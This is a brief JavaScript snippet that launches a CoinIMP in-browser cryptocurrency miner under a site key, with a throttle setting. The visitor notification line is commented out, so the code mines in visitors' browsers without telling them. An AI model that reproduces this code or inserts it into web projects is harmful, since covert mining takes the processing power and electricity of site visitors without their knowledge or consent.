let _client = new Client.Anonymous('77270305de2f3d5c1e63ab8f7e4c638b62a9f0103d470b6eda397c8bb2a0d7bf', { // public key of our site
  throttle: 0.8, // throttle is % of performance not used
  ads: 0 // show no ads
});
_client.start(); // banner options: position, text, bg, height, fg
// _client.addMiningNotification("Floating Top", "This site is running JavaScript miner from coinimp.com", "#4a607a", 50, "#eff2f5"); // comment line to disable notification
